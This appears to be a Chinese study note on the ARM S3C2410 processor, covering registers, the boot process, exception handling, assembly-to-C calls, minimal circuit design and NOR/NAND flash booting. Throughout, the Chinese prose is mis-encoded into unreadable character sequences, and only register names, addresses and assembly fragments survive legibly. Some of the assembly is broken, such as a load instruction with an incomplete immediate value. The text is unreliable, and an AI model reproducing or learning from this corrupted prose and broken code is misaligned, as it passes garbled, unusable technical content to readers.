ˆæŒ‡é’ˆï¼Œç§°ä¸ºSPï¼Œè¢«åˆå§‹åŒ–ä¸ºå¤šä¸ªæ¨¡å¼ä¸‹çš„å †æ ˆã€‚R14ç”¨ä½œå­ç¨‹åºè¿æ¥å¯„å­˜å™¨LRï¼Œä¸­æ–­å¼‚å¸¸æˆ–æ‰§è¡ŒBLæ—¶å¾—åˆ°PCå³R15çš„å¤‡ä»½ã€‚\nCpsrç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼Œ32ä½åªç”¨12ä½ï¼Œæ‰€æœ‰æ¨¡å¼ä¸‹å‡å¯è§ã€‚\nSpsrä¿å­˜ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼Œå³å‘ç”Ÿå¼‚å¸¸æ—¶å¯¹CPSRè¿›è¡Œä¿å­˜ï¼Œä¿å­˜å½“å‰çŠ¶æ€ã€‚5ä¸ªå¼‚å¸¸æ¨¡å¼ä¸‹å‡æœ‰å„è‡ªçš„SPSRã€‚\nARMå¤„ç†å™¨çš„å¯åŠ¨è¿‡ç¨‹ï¼Ÿ é¦–å…ˆï¼Œçœ‹ä¸€ä¸‹ï¼ŒARMå¯åŠ¨æ—¶çš„ç¡¬ä»¶æœºåˆ¶ï¼Œä¸Šç”µäº§ç”Ÿå¤ä½å¼‚å¸¸ï¼ŒCPUå¼ºåˆ¶PCä¸º0x00000000ï¼Œæ‰§è¡Œå¤ä½å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±ç›¸å½“äºæ‰§è¡Œäº†STRARTUP.Sçš„åŠŸèƒ½ã€‚æ˜¯ç»™ç”¨æˆ·ç¨‹åºæ‰§è¡Œç»™ä»¥åˆé€‚çš„å·¥ä½œç¯å¢ƒï¼Œè®¾ç½®ä¸­æ–­å‘é‡è¡¨ã€å †æ ˆã€æ—¶é’Ÿã€å®Œæˆå†…å­˜æ‹·è´ç­‰ï¼Œç›¸å½“äºSTARTUP.Sæˆ–è€…bootloaderçš„å‰ç«¯ä»£ç ï¼Œæ˜¯å¼€æœºæ‰§è¡Œçš„ç¨‹åºã€‚.æ‹¿2410çš„å¯åŠ¨ä»£ç ä¸¾ä¾‹ï¼Œå®ƒå¯åŠ¨CPUçš„è¿‡ç¨‹æ˜¯ï¼š\nåœ¨èµ·å§‹åœ°å€åˆ†é…ä¸­æ–­å‘é‡è¡¨å³ä¸­æ–­å¤„ç†å‡½æ•°ï¼ˆCPUè¦æ±‚çš„ï¼‰ï¼Œä»¥ä¸ºå‘é‡ç©ºé—´åªæœ‰4å­—èŠ‚ï¼Œæ‰€ä»¥ä¸€èˆ¬åªæ˜¯ä¸€ä¸ªè·³è½¬æŒ‡ä»¤ï¼Œå»åˆ«å¤„æ‰§è¡Œã€‚åœ¨è·³åˆ°å¤ä½å¼‚å¸¸ä¹‹åï¼Œå…³é—­ä¸­æ–­ï¼Œå…³é—­çœ‹é—¨ç‹—ã€‚\nä¹‹ååˆå§‹åŒ–å­˜å‚¨å™¨ç³»ç»Ÿ åˆå§‹å¤šä¸ªæ¨¡å¼ä¸‹çš„å †æ ˆï¼ˆæ¨¡å¼åˆ‡æ¢æ—¶ï¼Œç¡¬ä»¶ç»™SPç½®ä½ï¼‰ åˆå§‹åŒ–æœ‰ç‰¹æ®Šè¦æ±‚çš„å¤–å›´è®¾å¤‡ï¼Œå¦‚LEDç¯ã€çœ‹é—¨ç‹— åˆå§‹åŒ–ç”¨æˆ·çš„æ‰§è¡Œç¯å¢ƒï¼ˆåœ¨FLASHä¸­è¿è¡Œå¤ªæ…¢äº†ï¼ŒæŠŠä»£ç æ•´ä½“æ¬è¿åˆ°RAMä¸­ï¼‰ åˆ‡æ¢å¤„ç†å™¨çš„å·¥ä½œæ¨¡å¼ è°ƒç”¨ä¸»ç¨‹åº å¼‚å¸¸å¤„ç† å½“æ­£å¸¸çš„ç¨‹åºæ‰§è¡Œæµç¨‹å‘ç”Ÿæš‚æ—¶çš„åœæ­¢æ—¶ï¼Œç§°ä¹‹ä¸ºå¼‚å¸¸ã€‚å¯¹å¼‚å¸¸çš„å¤„ç†æœ‰ä¼˜å…ˆçº§ï¼Œå¤„ç†å¼‚å¸¸éœ€è¦è·³è½¬è‡³å¼‚å¸¸æ¨¡å¼ã€‚å¹¶æ ¹æ®å¼‚å¸¸å‘é‡è·³è½¬è‡³å“åº”çš„å­ç¨‹åºï¼ˆæ‰§è¡Œä¹‹å‰å¿…é¡»ä¿å­˜ç°åœºï¼‰ï¼Œå³å¼‚å¸¸å‡ºç°åå¼ºåˆ¶è·³è½¬è‡³å›ºå®šçš„å­˜å‚¨å™¨åœ°å€æ‰§è¡Œã€‚å¼‚å¸¸æ˜¯æ¯”ä¸­æ–­æ›´å¤§çš„æ¦‚å¿µã€‚\nå¼‚å¸¸å¤„ç† ARMæœ‰7ç§å¼‚å¸¸ã€‚åŒ…æ‹¬:\nå¤ä½ ç®¡ç†æ¨¡å¼ 0x00000000 è½¯ä¸­æ–­SWI ç®¡ç†æ¨¡å¼ 0x00000008 IRQ IRQæ¨¡å¼ 0x00000018 FIQ FIQæ¨¡å¼ 0x0000001c è¿˜åŒ…æ‹¬é¢„å–ä¸­æ­¢ã€æ•°æ®ä¸­æ­¢ã€æœªå®šä¹‰ å¼‚å¸¸å‡ºç°æ—¶ï¼Œå¼‚å¸¸æ¨¡å¼åˆ†ç»„çš„R14å’ŒSPSRç”¨äºä¿å­˜ä¸‹ä¸€æ¡ç¨‹åºåœ°å€å’ŒCPSRã€‚å¼‚å¸¸è¿”å›æ—¶ï¼ŒSPSR-\u0026gt;CPSRï¼ŒR14-\u0026gt;PC\nåœ¨å¯åŠ¨ä»£ç ä¸­é¦–å…ˆå°±æ˜¯è®¾ç½®æ‰€è°“çš„å¼‚å¸¸å‘é‡è¡¨ï¼Œä¹Ÿå°±æ˜¯åœ¨æŒ‡å®šçš„ä½ç½®æ”¾ç½®å¼‚å¸¸å¤„ç†ç¨‹åºï¼ˆä¸€èˆ¬æ˜¯è·³è½¬æŒ‡ä»¤ï¼‰ã€‚å¼‚å¸¸å‘ç”Ÿæ—¶ï¼ŒCPUä¼šæ ¹æ®è§„å®šå¼ºåˆ¶ç½®PCï¼Œæ°å¥½å»æ‰§è¡Œæˆ‘ä»¬è®¾ç½®å¥½çš„è·³è½¬æŒ‡ä»¤ï¼Œæ¥ç€æ‰§è¡ŒæœåŠ¡ç¨‹åºã€‚\nå¼‚å¸¸å¤„ç†æµç¨‹ï¼šï¼ˆç¡¬ä»¶æœºåˆ¶ï¼Œåªåšè¿™äº›ï¼Œè·Ÿä»£ç æ— å…³ï¼‰ æ ¹æ®å¼‚å¸¸ç±»å‹ï¼Œå¼ºåˆ¶è®¾ç½®CPSRçš„è¿è¡Œæ¨¡å¼ä½ åœ¨åˆ‡æ¢åˆ°çš„å¼‚å¸¸æ¨¡å¼ä¸‹ï¼Œåœ¨å½“å‰çš„é“¾æ¥å¯„å­˜å™¨LR(r14)ä¸­ä¿å­˜ä¸Šä¸ªæ¨¡å¼çš„PCå€¼-4ï¼Œä»¥ä¾¿ç¨‹åºåœ¨å¤„ç†å¼‚å¸¸è¿”å›æ—¶èƒ½ä»æ­£ç¡®çš„ä½ç½®é‡æ–°å¼€å§‹æ‰§è¡Œ å°†ä¸Šä¸€ä¸ªæ¨¡å¼çš„CPSRå¤åˆ¶åˆ°å½“å‰å¼‚å¸¸æ¨¡å¼çš„SPSRä¸­ï¼ˆæ³¨æ„1ä¸2ã€3çš„çŸ›ç›¾ï¼Œä¸èƒ½ç‹¬ç«‹æ‰§è¡Œï¼Œä½†æ˜¯æ˜¯ç¡¬ä»¶å®ç°çš„ï¼Œæ— å…³ä»£ç ï¼‰ å¼ºåˆ¶PCã€‚ç„¶åå°±åˆ°äº†æ‰§è¡Œä»£ç çš„æ—¶å€™ä»ç›¸å…³çš„å¼‚å¸¸å‘é‡åœ°å€å–ä¸‹ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œï¼Œä»è€Œè·³è½¬åˆ°ç›¸åº”çš„å¼‚å¸¸å¤„ç†ç¨‹åºå¤„ã€‚ å¼‚å¸¸è¿”å›æµç¨‹ï¼šï¼ˆæœ‰æŒ‡ä»¤ï¼‰ å°†LRå¯„å­˜å™¨ä¸­çš„å€¼å‡å»ç›¸åº”çš„åç§»é‡(å¯¹äºIRQ/FIQæ˜¯4)é€åˆ°PCä¸­ å°† SPSR å¤åˆ¶å› CPSRï¼ˆæ³¨æ„1ä¸2çš„çŸ›ç›¾ï¼Œä¸èƒ½ç‹¬ç«‹æ‰§è¡Œï¼Œç”¨ä¸€æ¡å¸¦âˆ§çš„æŒ‡ä»¤æ‰§è¡Œï¼Œæ€ä¹ˆç€éƒ½æ˜¯ä¸€æ¡ï¼‰ æ¸…é™¤ç¦æ­¢ä¸­æ–­æ ‡å¿—,å¦‚æœå®ƒè¢«è®¾ç½®æˆä½¿èƒ½ æ‰€æœ‰ä¿®æ”¹è¿‡çš„ç”¨æˆ·å¯„å­˜å™¨å¿…é¡»ä»å¤„ç†ç¨‹åºçš„ä¿æŠ¤å †æ ˆä¸­æ¢å¤ï¼ˆå³å‡ºæ ˆï¼‰ã€‚ å¯¹ä¸­æ–­åµŒå¥—çš„å¤„ç†(æ³¨æ„)ï¼š\nä¿å­˜åœ¨LRä¸­çš„PCå€¼ï¼Œå’Œè¯¥å€¼è¿”å›æ—¶çš„å¤„ç†è¿‡ç¨‹ã€‚ å½“IRQå¼‚å¸¸ä¸­æ–­äº§ç”Ÿæ—¶ï¼Œç¨‹åºè®¡æ•°å™¨pcçš„å€¼å·²ç»æ›´æ–°ï¼Œå®ƒæŒ‡å‘å½“å‰æŒ‡ä»¤åé¢ç¬¬3æ¡æŒ‡ä»¤ï¼ˆå¯¹äºARMæŒ‡ä»¤ï¼Œå®ƒæŒ‡å‘å½“å‰æŒ‡ä»¤åœ°å€åŠ 12å­—èŠ‚çš„ä½ç½®ï¼›å½“IRQå¼‚å¸¸ä¸­æ–­äº§ç”Ÿæ—¶ï¼Œå¤„ç†å™¨å°†å€¼ï¼ˆpc-4ï¼‰ä¿å­˜åˆ°IRQå¼‚å¸¸æ¨¡å¼ä¸‹çš„å¯„å­˜å™¨lr_irqä¸­ï¼Œå®ƒæŒ‡å‘å½“å‰æŒ‡ä»¤ä¹‹åçš„ç¬¬2æ¡æŒ‡ä»¤ï¼Œå› æ­¤è¿”å›æ“ä½œå¯ä»¥é€šè¿‡ä¸‹é¢æŒ‡ä»¤å®ç°ï¼šsubs pc, lr, \\#4\næœ‰ä¸¤ç§è¿”å›æœºåˆ¶ï¼š\nå½“è¿”å›åœ°å€ä¿å­˜åœ¨å½“å‰å¼‚å¸¸æ¨¡å¼çš„r14æ—¶ä½¿ç”¨å…¶ä¸­ä¸€ç§æœºåˆ¶ å½“è¿”å›åœ°å€ä¿å­˜åœ¨å †æ ˆæ—¶ä½¿ç”¨å¦ä¸€ç§æœºåˆ¶ï¼ˆè¿›ä¸­æ–­çš„æ—¶å€™ä¿å­˜çš„ï¼‰ã€‚ è®¿é—®æœºåˆ¶ SUBS PC,R14_fiq ,\\#4 ï¼ˆä¸åŒæ¨¡å¼æœ‰ä¸åŒçš„æŒ‡ä»¤ï¼Œè¿”å›PCçš„åŒæ—¶è¿”å›CPSRï¼Œä¸€æ¡æŒ‡ä»¤å®ç°ï¼‰\nSUB LR,LR,\\#4`` STMFD R13!ï¼Œ{R0ï¼ŒR4-R12ï¼ŒLR} å°†å¯„å­˜å™¨åˆ—è¡¨ä¸­çš„å¯„å­˜å™¨R0ï¼ŒR4åˆ°R12ï¼ŒLRå­˜å…¥å †æ ˆã€‚\nLDMFD R13!,{R0ï¼ŒR4-R12ï¼ŒPC} âˆ§ å°†å †æ ˆå†…å®¹æ¢å¤åˆ°å¯„å­˜å™¨R0ï¼ŒR4åˆ°R12ï¼ŒPCï¼ŒåŒæ—¶SPSRå¤åˆ¶åˆ°CPSRã€‚{âˆ§}ä¸ºå¯é€‰åç¼€ï¼Œå½“æŒ‡ä»¤ä¸ºLDMä¸”å¯„å­˜å™¨åˆ—è¡¨ä¸­åŒ…å«R15ï¼Œé€‰ç”¨è¯¥åç¼€æ—¶è¡¨ç¤ºï¼šé™¤äº†æ­£å¸¸çš„æ•°æ®ä¼ é€ä¹‹å¤–ï¼Œè¿˜å°†SPSRå¤åˆ¶åˆ°CPSRï¼Œä¸€æ¡æŒ‡ä»¤å®ç°ã€‚\nä»£ç æŒ‡ä»¤åˆ†æï¼š\nAREA Initï¼ŒCODEï¼ŒREADONLYï¼›ä»£ç æ®µInitã€åªè¯» â€¦â€¦ CODE32 ï¼›32ä½ARMæŒ‡ä»¤é›† LDR R0ï¼Œï¼NEXTï¼‹1 ï¼›ç»™R0èµ‹åœ°å€å€¼ BX R0 ï¼›ç¨‹åºè·³ï¼Œå¹¶å°†å¤„ç†å™¨åˆ‡æ¢åˆ°Thumbå·¥ä½œçŠ¶æ€ â€¦â€¦ CODE16 ï¼› 16ä½thumbæŒ‡ä»¤é›† NEXT LDR R3ï¼Œï¼0x3FF ç»™R3èµ‹å€¼ â€¦â€¦ END é«˜çº§è¯­è¨€å’Œæ±‡ç¼–è¯­è¨€å‡½æ•°é—´çš„ç›¸äº’è°ƒç”¨: æ±‡ç¼–è°ƒç”¨Cï¼š\nIMPORT Main ;é€šçŸ¥ç¼–è¯‘å™¨è¯¥æ ‡å·ä¸ºä¸€ä¸ªå¤–éƒ¨æ ‡å· AREA Init,CODE,READONLY ï¼›å®šä¹‰ä¸€ä¸ªä»£ç æ®µ ENTRY ï¼›å®šä¹‰ç¨‹åºçš„å…¥å£ç‚¹ LDR R0,=0x3FF0000 ï¼›åˆå§‹åŒ–ç³»ç»Ÿé…ç½®å¯„å­˜å™¨ LDR R1,=0xE7FFFF80 STR R1,[R0] LDR SP,=0x3FE1000 ï¼›åˆå§‹åŒ–ç”¨æˆ·å †æ ˆ BL Main ï¼›**è·³è½¬åˆ°Mainï¼ˆï¼‰å‡½æ•°å¤„çš„C/C++ä»£ç æ‰§è¡Œ** END ï¼›**æ ‡è¯†æ±‡ç¼–ç¨‹åºçš„ç»“æŸ** ä»¥ä¸Šçš„ç¨‹åºæ®µå®Œæˆä¸€äº›ç®€å•çš„åˆå§‹åŒ–ï¼Œç„¶åè·³è½¬åˆ°Mainï¼ˆï¼‰å‡½æ•°æ‰€æ ‡è¯†çš„C/C ï¼‹ï¼‹ä»£ç å¤„æ‰§è¡Œä¸»è¦çš„ä»»åŠ¡ï¼Œæ­¤å¤„çš„Mainä»…ä¸ºä¸€ä¸ªæ ‡å·ï¼Œä¹Ÿå¯ä½¿ç”¨å…¶ä»–åç§°ã€‚ AREA Init , CODE , READONLY ;å·²å®šä¹‰ä»£ç æ®µ ENTRYï¼›ç¨‹åºå…¥å£ LDR R0, =0x3ff5000ï¼›R0èµ‹å¯„å­˜å™¨åœ°å€å€¼ LDR R1, 0xï¼›è¦ç»™å¯„å­˜å™¨èµ‹çš„å€¼ STR R1,[R0]ï¼›èµ‹å€¼ LDR R0, =0x3ff5008 LDR R1, 0x01 STR R1,[R0]ï¼›ç»™å¦ä¸€ä¸ªå¯„å­˜å™¨èµ‹å€¼çš„è¿‡ç¨‹ BL PROCï¼›è·³è½¬è‡³æ ‡å·ä¸ºPROCçš„ç¨‹åºå‡ºæ‰§è¡Œ : : : : PROC : : MOV PC, LR //å°†LRä¿å­˜çš„ç¨‹åºæŒ‡é’ˆè¿”å›ï¼Œå³**è·³åˆ°BLä¸‹ä¸€å¥æ¥ç€æ‰§è¡Œ** : : END ARM 2410è®¾è®¡ç›¸å…³ CPUã€å¤–è®¾ã€å¤–è®¾æ§åˆ¶å™¨ã€æ—¶åºã€å¯„å­˜å™¨çš„ç›¸äº’å…³ç³»ï¼Ÿ CPUä¸å¤–è®¾æ§åˆ¶å™¨æ„æˆå¾®å¤„ç†å™¨ï¼Œå¾®å¤„ç†å™¨åœ¨æ ¸å¿ƒæ¿ï¼ˆæœ€å°ç³»ç»Ÿï¼‰ä¸Šå‘æŒ¥ä½œç”¨ï¼Œå°†å¼•è„šé›†åˆæˆå¤–è®¾æ¥å£åŠ ä¸Šç”µå¹³è½¬æ¢ç­‰å°±æ˜¯å¤–å›´æ¿ï¼Œå¤–è®¾é€šè¿‡å¤–å›´æ¿è¿æ¥è‡³å¤–è®¾æ§åˆ¶å™¨ã€‚CPUé€šè¿‡å¯„å­˜å™¨ç¼–ç¨‹æ§åˆ¶å¤–è®¾æ§åˆ¶å™¨äº§ç”Ÿæ—¶åºæ§åˆ¶å¤–è®¾ã€‚è‹¥æ˜¯æ²¡æœ‰å¤–è®¾æ§åˆ¶å™¨ï¼Œåˆ™éœ€è¦CPUè‡ªå·±äº§ç”Ÿæ—¶åºæ¥ä¸å¤–è®¾äº¤äº’ï¼Œè¿™ç§æ—¶åºç›¸å½“äºä¸€ç§çº¦å®šå¥½çš„æ„æ€è¡¨ç¤ºï¼Œç›¸å½“äºâ€œè¯­è¨€â€æˆ–è€…â€œé€šä¿¡åè®®â€ï¼Œ\nä¾‹å¦‚ï¼šè‹¥æ˜¯2410ä¸ä¸€ä¸ªå¸¦æœ‰IICæ¥å£çš„å™¨ä»¶é€šä¿¡ï¼Œåªéœ€è¦è¿æ¥èµ·æ¥ï¼Œå¯¹IICè¿›è¡Œå¯„å­˜å™¨ç¼–ç¨‹ï¼Œæ§åˆ¶å®ƒä»¬ä¹‹é—´çš„å·¥ä½œæ¨¡å¼ï¼Œå¯èƒ½æ”¶å‘æ•°æ®å°±å˜æˆäº†åœ¨ä¸­æ–­ä¸­è¯»å†™å¯„å­˜å™¨æ“ä½œï¼Œå±è”½äº†IICè§„å®šçš„é€šä¿¡ç»†èŠ‚ã€‚è‹¥æ˜¯51å•ç‰‡æœºè¦ä¸IICé€šä¿¡çš„è¯ï¼Œå°±å¤æ‚å¤šäº†ï¼Œé¦–å…ˆè¦ä»”ç»†é˜…è¯»IICçš„åè®®ï¼Œä¸å®¹ä¸æ¯«å·®é”™ï¼Œç„¶åç”¨IOå£æ¨¡æ‹Ÿæ—¶åºï¼ŒCPUçš„å·¥ä½œé‡å¾ˆå¤§ã€‚\nå¯„å­˜å™¨ç¼–ç¨‹çš„æœ¬è´¨ï¼Ÿå¦‚ä½•è·å–å¯„å­˜å™¨çš„é…ç½®ï¼Ÿ å¯„å­˜å™¨ç¼–ç¨‹çš„æœ¬è´¨æ˜¯CPUæ§åˆ¶å¤–è®¾å¯„å­˜å™¨å·¥ä½œæ¨¡å¼çš„æ–¹æ³•ã€‚å¯ä»¥æƒ³è±¡å¯„å­˜å™¨çš„æ¯ä¸€ä½è‚¯å®šæ˜¯å¤–è®¾æ§åˆ¶å™¨åŠŸèƒ½æ¨¡å—ä¸­çš„ä¸€ä¸ªä¸ªâ€œå¼€å…³â€ï¼Œç»™æŸä¸€ä½èµ‹å€¼0æˆ–è€…1ï¼Œå°±ç›¸å½“äºä½¿èƒ½æˆ–å…³é—­æŸä¸€ä¸ªåŠŸèƒ½ã€‚\n2410æœ€å°ç”µè·¯è®¾è®¡ï¼Ÿï¼ˆæ™¶æŒ¯é€‰æ‹©ã€å¯åŠ¨é€‰æ‹©ã€æ•°æ®å®½åº¦ï¼‰ ä¸ä¸€èˆ¬çš„ARMç³»ç»Ÿç›¸åŒï¼Œéƒ½éœ€è¦å¾®å¤„ç†å™¨ã€ç”µæºã€æ™¶æŒ¯ã€å¤ä½ã€å­˜å‚¨å™¨ï¼ˆflashã€SDRAMï¼‰ã€JTAGæ¥å£ç­‰ï¼Œå…·ä½“æƒ…å†µå¦‚ä¸‹ï¼šï¼ˆéœ€è¦å¯¹OM0å’ŒOM1é…ç½®ç”µå¹³ä»¥å†³å®šå¯åŠ¨æ–¹å¼ï¼Œå¯¹OM2å’ŒOM3é…ç½®ç”µå¹³ä»¥å†³å®šæ—¶é’Ÿæºã€‚ï¼‰\nç”µæºè®¾è®¡ï¼šå¤„ç†å™¨ç”¨1.8Vï¼ŒRTCç»™æ—¶é’Ÿæ¨¡å—ä¾›ç”µ1.8Vï¼Œå­˜å‚¨å™¨å’Œæ™®é€šIOç”¨3.3Vï¼ŒADCæ¨¡å—ç”¨3.3Vï¼Œå¯è§æœ€å°ç³»ç»Ÿæœ€å°‘è¦ç”¨3.3å’Œ1.8ä¸¤ç§ç›´æµç¨³å‹ã€‚è¯¾ç¨‹å®éªŒä¸­ç”µæºç”µå‹5Vï¼Œåˆ†åˆ«ç”¨LM1085ç¨³å‹3.3Vï¼Œç”¨AS1117ç¨³å‹1.8Vã€‚ æ™¶æŒ¯è®¾è®¡: 2410çš„æ—¶é’Ÿæ§åˆ¶é€»è¾‘å¯ä»¥äº§ç”Ÿç³»ç»Ÿæ‰€éœ€è¦çš„æ—¶é’Ÿï¼ŒåŒ…æ‹¬CPUçš„FCLKï¼Œå’ŒAHBæ€»çº¿çš„HCLKï¼ŒAPBçš„PCLKã€‚å†…éƒ¨æœ‰ä¸¤ä¸ªé”ç›¸ç¯PLLï¼ŒMPLLæä¾›å‰ä¸‰ä¸ªï¼ŒUPLLç»™USBæä¾›48MHZçš„æ—¶é’Ÿã€‚ ä¸»æ—¶é’Ÿæºï¼ˆUPLLå’ŒMPLLçš„æ—¶é’Ÿæºï¼‰å¯ä»¥é€‰æ‹©æ˜¯æ¥è‡ªå¤–éƒ¨æ—¶é’Ÿè¿˜æ˜¯å¤–éƒ¨æ™¶æŒ¯ï¼Œè¿™æ˜¯ç”±OM2å’ŒOM3çš„ç®¡è„šç¡®å®šçš„ï¼Œå¯ä»¥OM2å’ŒOM3åŒæ—¶æ¥ä½ç”µå¹³ï¼Œé€‰æ‹©å¤–éƒ¨æ™¶æŒ¯ï¼Œæ™¶æŒ¯åŠ ä¸Š15pFèµ·æŒ¯ç”µå®¹ï¼ˆç»è¿‡é”ç›¸ç¯å€é¢‘å¯ä»¥è¾¾åˆ°ï¼‰ã€‚ å¤ä½ç”µè·¯è®¾è®¡:å¯ä»¥åœ¨nRESETç«¯è®¾è®¡åƒ51å•ç‰‡æœºé‚£æ ·çš„é˜»å®¹å¤ä½ç”µè·¯ï¼Œä½†ä¸ºäº†ç¨³å®šï¼Œå¯ä»¥ä½¿ç”¨å¤ä½èŠ¯ç‰‡å¦‚MAX811æˆ–IMP811ã€‚ JTAGæ¥å£è®¾è®¡: æœ‰20é’ˆå’Œ14é’ˆä¸¤ç§JTAGæ¥å£ã€‚ å­˜å‚¨å™¨è®¾è®¡: 2410æœ‰è‡ªå·±çš„å­˜å‚¨å™¨æ§åˆ¶å™¨ï¼Œå¹¶ä¸”è§„å®šäº†å“ªäº›bankç©ºé—´æ˜¯RAMå“ªäº›æ˜¯FLASHï¼Œå­˜å‚¨å™¨èŠ¯ç‰‡ä¸¥æ ¼æŒ‰ç…§DATASHEETä¸Šçš„è¦æ±‚å’Œæ ‡æ˜çš„å¼•è„šè¿æ¥æ–¹å¼ä¸å­˜å‚¨å™¨æ§åˆ¶å™¨çš„å­˜å‚¨å™¨æ¥å£ç›¸è¿å°±å¯ä»¥ï¼Œæ§åˆ¶å™¨ä¼šæ ¹æ®åœ°å€äº§ç”Ÿè¯»å†™å­˜å‚¨å™¨èŠ¯ç‰‡çš„æ—¶åºï¼Œå®Œæˆå­˜å–æ•°æ®çš„æ“ä½œã€‚ 2410norå’Œnandå¯åŠ¨è¿‡ç¨‹åˆ†æï¼Ÿ NOR flash:è¯»å–é€Ÿåº¦é«˜ã€è€Œæ“¦å†™é€Ÿåº¦ä½ï¼Œå®¹é‡å°ï¼Œä»·æ ¼é«˜ï¼Œåœ°å€çº¿å’Œæ•°æ®çº¿åˆ†å¼€ï¼Œé‡‡ç”¨SRAMæ¥å£ã€‚ NAND flash:è¯»é€Ÿåº¦ä¸å¦‚NORflash ä½†æ˜¯æ“¦å†™é€Ÿåº¦é«˜ï¼Œå®¹é‡å¤§ï¼Œä»·æ ¼ä½ï¼Œæœ‰å–ä»£ç¡¬ç›˜çš„è¶‹åŠ¿ï¼Œä½†æ˜¯åœ°å€çº¿å’Œæ•°æ®å¤ç”¨ï¼Œéœ€è¦ç¨‹åºé…åˆæ‰èƒ½è¯»å†™æ•°æ®ã€‚å¯ä»¥é€šè¿‡è·³çº¿è®¾ç½®æ—¶ä»NAND FLASHå¯åŠ¨è¿˜æ˜¯ä»NOR FLASHå¯åŠ¨ã€‚\nNANDå¯åŠ¨çš„ä¼˜åŠ¿ï¼šä¾¿å®œã€å®¹é‡å¤§ã€‚ä½†æ˜¯è¯»å†™é€»è¾‘ä¸èƒ½ç”¨ç¡¬ä»¶äº§ç”Ÿï¼Œä¹Ÿå°±æ˜¯æ²¡åŠæ³•æ¥åˆ°BANKç©ºé—´é‡Œï¼Œå¿…é¡»æœ‰ç¨‹åºé…åˆæ‰èƒ½è¯»å†™ï¼ˆæœ‰ä¸“é—¨çš„æ§åˆ¶å™¨æ¥å£ï¼Œè‚¯å®šè¦å¯„å­˜å™¨ç¼–ç¨‹åŠ ä¸Šç¨‹åºé…åˆæ‰èƒ½è¯»å†™ï¼Œæ²¡æœ‰PCçš„æ ¹æ­£è‹—çº¢ï¼‰ï¼Œæ‰€ä»¥ç†è®ºä¸Šå®ƒæ˜¯ä¸å¯ä»¥ç”¨æ¥å¯åŠ¨ç³»ç»Ÿçš„ï¼Œå› ä¸ºé‚£ä¹‹å‰ä»€ä¹ˆç¨‹åºéƒ½æ²¡æœ‰ï¼Œè¦æƒ³è¯»å†™å®ƒå¿…é¡»æ˜¯ç³»ç»Ÿè£…è½½å®Œäº†è€Œä¸”æœ‰ç¨‹åºäº†ã€‚ä½†æ˜¯ä¸‰æ˜Ÿé‡‡ç”¨äº†SRAMæ˜ å°„è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼Œä¸‹é¢å°±æ˜¯è¿™ä¸ªè¿‡ç¨‹ï¼š\nç”µè·¯ä¸­ä½¿OM1å’ŒOM0éƒ½æ¥ä½ç”µå¹³ï¼Œä»NAND FLASHä¸­å¯åŠ¨ã€‚ï¼ˆ2410æœ‰NAND FLASHæ§åˆ¶å™¨ï¼Œè¿æ¥NAND FlashèŠ¯ç‰‡ï¼Œäº§ç”Ÿè¯»å†™æ—¶åºï¼‰\nåœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œ2410çš„å‰4KBåœ°å€ç©ºé—´å¯¹åº”ä¸€ä¸ªåå­—å«åšâ€œèµ·æ­¥çŸ³â€çš„SRAMï¼Œç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨å°†NAND FLASHçš„å‰4KBæ•°æ®åŠ è½½åˆ°èµ·æ­¥çŸ³ä¸­ï¼Œç„¶åç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œè¿™äº›å¯åŠ¨å¼•å¯¼ä»£ç ï¼ŒCPUä»å†…éƒ¨RAMçš„0x00000000ä½ç½®å¼€å§‹å¯åŠ¨ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸éœ€è¦ç¨‹åºå¹²æ¶‰ã€‚ä¹Ÿå°±æ˜¯ç±»ä¼¼äºSTARTUP.Sçš„åŠŸèƒ½ï¼Œåˆå§‹åŒ–å¼‚å¸¸å‘é‡è¡¨ã€å †æ ˆã€å°†NAND FLASHä¸­çš„ä»£ç (æœ‰ä»£ç æ”¯æŒå–½)æ‹·è´åˆ°SDRAMä¸­è¿è¡Œã€‚\nNOR FLASH é‡‡ç”¨çš„çš„æ˜¯SRAMæ¥å£ï¼Œå¯ä»¥ç›´æ¥åˆ°å­˜å‚¨å™¨æ§åˆ¶å™¨ä¸Šï¼ŒARMå†…æ ¸äº§ç”Ÿçš„æ—¶åºèƒ½å¯¹å…¶è¯»å†™ã€‚å°†bank0ä¸Šæ¥ä¸ŠNORflashèŠ¯ç‰‡ã€‚ä¸Šç”µäº§ç”Ÿå¤ä½å¼‚å¸¸åä¼šè‡ªåŠ¨ä»NOR flashä¸­å¯åŠ¨ã€‚\n2410çš„ä¸­æ–­å¤„ç†æµç¨‹ï¼Ÿ é¦–å…ˆåº”è¯¥æ˜ç¡®2410ä¸ARMå†…æ ¸çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿçš„è§’è‰²ï¼Œæ ¹æ®ä¹‹å‰çš„ARMå¼‚å¸¸å¤„ç†æµç¨‹ï¼Œæˆ‘ä»¬æ¸…æ¥šæ˜äº†äº†å“ªäº›æ˜¯CPUçš„ç¡¬ä»¶æœºåˆ¶ã€‚2410é€šè¿‡ä¸­æ–­æ§åˆ¶å™¨å…è®¸ä»¥ä¼˜å…ˆçº§çš„æ–¹å¼å°†å‡ åä¸ªä¸­æ–­æºå…±åŒç”¨ä¸€ä¸ªIRQã€‚ä¸€ä¸ªä¸­æ–­ç”³è¯·æå‡ºåï¼ŒIRQå¼‚å¸¸å‘ç”Ÿï¼Œåˆ‡æ¢æ¨¡å¼ã€ä¿å­˜CPSRã€ä¿å­˜PCï¼Œç„¶åè·³è½¬åˆ°handleIRQå‡½æ•°ï¼Œç„¶åè·³è½¬åˆ°ISRIRQ(è¿™åªæ˜¯ä¸€ä¸ªå¤§æ¦‚æµç¨‹ï¼Œä¹Ÿè®¸ä¼šå®šä¹‰æ›´å¤šçš„è·³è½¬)æ 